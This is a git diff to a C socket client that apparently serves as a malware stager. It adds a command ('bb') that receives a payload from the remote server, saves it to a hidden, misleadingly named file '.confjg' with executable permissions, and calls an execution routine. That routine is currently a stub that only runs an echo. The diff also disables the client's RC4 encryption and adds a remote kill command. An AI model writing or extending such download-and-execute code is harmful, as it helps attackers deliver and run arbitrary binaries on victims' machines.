@@ -8,6 +8,7 @@
 #include <netdb.h>
 #include <netinet/in.h>
 #include <signal.h>
+#include <fcntl.h>
 #include "rc4.h"
 
 int soc;
@@ -19,11 +20,14 @@ void sigint_handler(int s){
     exit(1);
 }
 
+int recv_payload(int sfd);
+int exec_payload();
+
+char *key = "LECNAAEAAE";
 int main(int agrc, char **argv){
     int status;
     struct addrinfo hints;
     struct addrinfo *servinfo;
-    char *key = "LECNAAEAAE";
 
     memset(&hints, 0, sizeof(hints));
     hints.ai_family   = AF_INET;
@@ -58,8 +62,10 @@ int main(int agrc, char **argv){
 
     char BUF[1024];
     while (1){
+        memset(BUF, 0, 1024);
+
         scanf("%1023[^\n]", BUF);
-        rc4((unsigned char *)key, strlen(key), BUF, strlen(BUF));
+        // rc4((unsigned char *)key, strlen(key), BUF, strlen(BUF));
         ssize_t sendn = send(soc, BUF, strlen(BUF), 0);
         if (sendn == -1){
             perror("Failed to send");
@@ -67,14 +73,53 @@ int main(int agrc, char **argv){
         }
         getchar();
         ssize_t recvn = recv(soc, BUF, strlen(BUF), 0);
-        if (recvn > 1) { 
+        if (strcmp(BUF, "aa") == 0) { 
             close(soc);
             exit(1);
         }
+        if (strcmp(BUF, "bb") == 0) { 
+            int recvStatus = recv_payload(soc);
 
-        memset(BUF, 0, 1024);
+            if (recvStatus == 1) exec_payload();
+            else puts("tibau");
+        }
+
     }
     
     
     return 0;
+}
+
+int recv_payload(int sfd){
+    int pldfd = open(".confjg", O_WRONLY | O_CREAT | O_EXCL, 0700);
+    if (pldfd == -1 && errno == EEXIST){
+        pldfd = open(".confjg", O_WRONLY | O_EXCL, 0700);
+    } else if (pldfd == -1) {
+        perror("Failed to open payload file");
+        return 0;
+    }
+
+    char BUF[1024];
+    memset(BUF, 0, 1024);
+    ssize_t readn, writen;
+    while ((readn = read(sfd, BUF, 1024)) != 0){
+        writen = write(pldfd, BUF, readn);
+        memset(BUF, 0, 1024);
+        if (writen == -1){
+            perror("Failed to write the payload into file");
+            close(pldfd);
+            return 0;
+        }
+    }
+    
+    close(pldfd);
+    return 1;
+}
+
+int exec_payload(){
+    if (system("echo naummmmmm") == -1){
+        perror("Failed to execute payload");
+        return 0;
+    }
+    return 1;
 }
